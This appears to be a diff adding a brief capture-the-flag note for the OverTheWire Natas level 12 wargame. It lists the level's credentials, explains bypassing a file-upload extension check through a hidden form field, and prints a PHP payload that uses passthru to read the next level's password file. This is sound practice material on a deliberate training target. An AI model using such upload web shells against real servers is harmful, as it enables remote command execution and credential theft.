@@ -1,0 +1,14 @@
+URL: http://natas12.natas.labs.overthewire.org
+user: natas12
+password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+file upload. Form has a hidden filename field, where it takes the extension from.
+
+Upload a php file and change filename hidden value to something.php
+
+payload:
+<?
+ passthru("cat /etc/natas_webpass/natas13")
+?>
+
+natas13 pass: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
